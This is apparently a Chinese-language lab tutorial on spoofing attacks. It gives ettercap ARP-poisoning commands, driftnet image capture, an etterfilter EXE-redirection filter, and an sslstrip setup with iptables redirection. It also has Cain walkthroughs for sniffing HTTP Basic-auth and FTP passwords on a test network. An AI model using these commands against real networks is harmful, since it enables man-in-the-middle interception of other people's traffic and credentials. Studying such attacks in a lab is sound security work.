# 欺骗攻击

**Ettercap**

ettercap

```text
ettercap -i eth0 -T -q -M arp:remote /192.168.199.171// /192.168.199.1//
```

driftnet

```text
driftnet -i eth0 -a
```

tcpdump

```text
tcpdump -i eth0 arp -w 3
```

当192.168.199.171浏览图片时，会自动将图片下载至目录中：

![](https://p408.ssl.qhimgs4.com/t0152a888371efbf54a.png)

![](https://p408.ssl.qhimgs4.com/t01a5c8e14dbd5fe0e1.png)

当192.168.199.171登录采用http协议的系统时，会抓取其中的用户名/密码字段：

![](https://p408.ssl.qhimgs4.com/t0187b2a7d76bfed9ba.png)

将数据包导出分析：

本机数据包分析：

![](https://p408.ssl.qhimgs4.com/t01f68dd5c4119d5561.png)

可以看到攻击机一直再向本机发送ARP响应包，查看本机arp缓存表：

![](https://p408.ssl.qhimgs4.com/t01adc71339e1c5b6d1.png)

已经被攻击机的MAC地址占用。

**嗅探**

```text
ettercap -i wlan0 -T -q -M arp:remote /192.168.1.211// /192.168.1.119//
ettercap -i wlan0 -T -q -M arp:remote /// ///
```

-P 使用插件 -T 使用基于文本界面 -q 启动安静模式（不回显） -M 启动ARP欺骗攻击

**EXE重定向**

```text
etterfilter exe.filter -o exe.ef
ettercap -T -q -i wlan0 -F exe.ef -M ARP /// /192.168.1.211（目标IP）// -P autoadd
```

**嗅探SSL**

```text
echo “1”>/proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 9527
sslstrip -l 9527
或 python sslstrip.py -a -l 9527 -w sslstrip.log
```

#### Cain <a id="cain"></a>

**抓取HTTP协议中的密码**

访问phpstudy官网[www.phpstudy.net](http://www.phpstudy.net/)

![](https://p408.ssl.qhimgs4.com/t019d5e7189a9b33b52.png)

下载

![](https://p408.ssl.qhimgs4.com/t015ba6d97dd99eead8.png)

下载完成后点击安装

![](https://p408.ssl.qhimgs4.com/t01d9594e1a743f9c3b.png)

打开phpstudy，点击启动

![](https://p408.ssl.qhimgs4.com/t01216f3825017051b3.png)

访问127.0.0.1检查web服务是否正常

![](https://p408.ssl.qhimgs4.com/t01b2d8f3f5e41c61b7.png)

将下面的脚本保存到web根目录下auth.php &lt;?php header\("WWW-Authenticate: Basic realm=\”test\""\); header\("HTTP/1.0 401 Unauthorized"\);

![](https://p408.ssl.qhimgs4.com/t01c2b951b614b30a11.png)默认为C:\phpstudy\phptutorial\www

![](https://p408.ssl.qhimgs4.com/t017537d467eca4ae74.png)

浏览器中访问脚本，地址为[http://127.0.0.1/auth.php](http://127.0.0.1/auth.php)

![](https://p408.ssl.qhimgs4.com/t01a509004954fce49e.png)使用cain进行arp欺骗

![](https://p408.ssl.qhimgs4.com/t01545eaa930b6bf1e7.png)Ubuntu上使用curl请求url，使用—basic参数及-u参数进行http基础认证

![](https://p408.ssl.qhimgs4.com/t017b4a95db020fea4a.png)

Cain中抓取密码

![](https://p408.ssl.qhimgs4.com/t01a64be429df815c07.png)

至此，操作结束

**抓取FTP协议中的密码**

**1. 攻击机上下载cain并安装**

下载cain

![](https://p408.ssl.qhimgs4.com/t015dee1a2d3f187395.png)

安装时同时选择安装winpcap

![](https://p408.ssl.qhimgs4.com/t01584f6fb26da3130a.png)

打开cain

![](https://p408.ssl.qhimgs4.com/t01a21e9b5f305d5f7d.png)

关闭防火墙

![](https://p408.ssl.qhimgs4.com/t01e8c2eda5450cc7ba.png)

在ubuntu上安装pip Sudo apt-get install python-pip

![](https://p408.ssl.qhimgs4.com/t01e00b64c0f16f3223.png)

安装pyftpdlib: Pip install pyftpdlib

启动pyftpdlib

![](https://p408.ssl.qhimgs4.com/t01e00b0ed1d8c6d2bf.png)Windows下使用ftp客户端访问服务器，匿名登陆

![](https://p408.ssl.qhimgs4.com/t01dc65f59b1626a26a.png)使用cain扫描主机

![](https://p408.ssl.qhimgs4.com/t01cd046afcfa957532.png)

添加网关及需要欺骗的主机

![](https://p408.ssl.qhimgs4.com/t01a5c445ab03c13e80.png)

开始欺骗，再次使用ftp客户端访问，抓取密码

![](https://p408.ssl.qhimgs4.com/t017c58df6146d563f2.png)至此，操作结束

